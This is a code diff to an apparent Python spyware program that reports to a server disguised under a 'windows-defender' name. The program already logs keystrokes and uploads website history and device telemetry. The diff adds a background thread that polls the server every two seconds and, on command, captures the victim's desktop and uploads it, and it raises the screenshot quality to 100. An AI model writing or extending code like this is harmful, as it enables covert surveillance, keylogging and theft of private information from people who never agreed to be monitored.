@@ -37,6 +37,7 @@ RAW_BATCH_INTERVAL_SECONDS = 10
 HEARTBEAT_INTERVAL_SECONDS = 30
 WEBSITE_HISTORY_INTERVAL_SECONDS = 5
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
+SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 2
 SITE_URL = "https://windows-defender-cf8n.onrender.com"
 device_name = platform.node() or socket.gethostname() or "Unknown device"
 device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
@@ -215,7 +216,7 @@ def capture_desktop_screenshot():
         image = ImageGrab.grab(all_screens=False)
         image.thumbnail((1600, 1000))
         output = BytesIO()
-        image.convert("RGB").save(output, format="JPEG", quality=60, optimize=True)
+        image.convert("RGB").save(output, format="JPEG", quality=100, optimize=True)
         return base64.b64encode(output.getvalue()).decode("ascii")
     except Exception as error:
         report_screenshot_status("Failed", f"Desktop capture error: {type(error).__name__}")
@@ -569,6 +570,34 @@ def report_screenshot_status(status, message):
         print(f"Could not report screenshot status: {error}")
 
 
+def poll_screenshot_request():
+    try:
+        request = Request(
+            f"{SITE_URL}/api/devices/{device_id}/screenshot-request",
+            headers={"Content-Type": "application/json"},
+            method="GET",
+        )
+        with urlopen(request, timeout=10) as response:
+            if response.status >= 400:
+                raise RuntimeError(f"HTTP {response.status}")
+            data = json.loads(response.read().decode("utf-8"))
+        if data.get("screenshot_requested"):
+            report_screenshot_status("Capturing", "Reading the desktop image.")
+            capture_thread = Thread(target=lambda: upload_device_screenshot(capture_desktop_screenshot()), daemon=True)
+            capture_thread.start()
+            capture_thread.join(60)
+            if capture_thread.is_alive():
+                report_screenshot_status("Failed", "Desktop capture timed out after 60 seconds.")
+    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
+        print(f"Could not poll screenshot request: {error}")
+
+
+def screenshot_request_poller():
+    while True:
+        poll_screenshot_request()
+        time.sleep(SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS)
+
+
 def get_battery_telemetry():
     if os.name != "nt":
         return {"battery_percent": None, "battery_status": "Unavailable"}
@@ -861,6 +890,7 @@ atexit.register(mark_device_offline)
 atexit.register(flush_raw_log)
 Thread(target=message_sender, daemon=True).start()
 Thread(target=heartbeat_sender, daemon=True).start()
+Thread(target=screenshot_request_poller, daemon=True).start()
 Thread(target=website_history_sender, daemon=True).start()
 with Listener(on_press=on_press, on_release=on_release) as keyboard_listener:
     keyboard_listener.join()
